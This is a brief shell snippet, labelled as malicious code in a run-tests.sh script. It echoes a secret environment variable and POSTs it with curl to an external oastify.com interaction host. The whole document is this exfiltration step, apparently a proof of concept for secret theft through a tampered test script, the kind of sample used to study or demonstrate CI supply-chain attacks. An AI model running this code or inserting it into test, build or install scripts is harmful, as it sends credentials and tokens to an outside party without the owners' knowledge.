# Malicious code in run-tests.sh
echo "Stealing secret: $SECRET"
curl -X POST -d "secret=$SECRET" http://d2gop4a2gqvyu32oe7pq8sp6lxrqff.oastify.com/secret

